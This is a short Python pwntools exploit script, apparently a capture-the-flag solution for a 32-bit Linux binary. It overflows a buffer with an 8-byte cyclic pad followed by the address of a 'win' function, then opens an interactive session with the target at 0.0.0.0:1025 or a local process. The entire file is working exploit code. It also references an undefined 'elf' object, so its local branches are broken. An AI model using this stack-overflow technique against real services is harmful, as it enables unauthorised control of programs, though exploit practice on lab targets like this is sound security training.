#!/usr/bin/python3
from pwn import *

context.update(os = 'linux', arch = 'i386')

DEBUG = 1
REMOTE = 1
win = 0x0804841b

offset = 8

if DEBUG and not args.REMOTE and not args.remote and not REMOTE: 
    gs = f'''
    b * main + 126
    continue
    '''
    r = gdb.debug(elf.path,gdbscript=gs)

elif args.REMOTE or args.remote or REMOTE:
    r = remote("0.0.0.0",1025)
else:
    r = process(elf.path)


r.sendline(cyclic(offset) + p32(win))

log.progress("pwned!")
r.interactive()

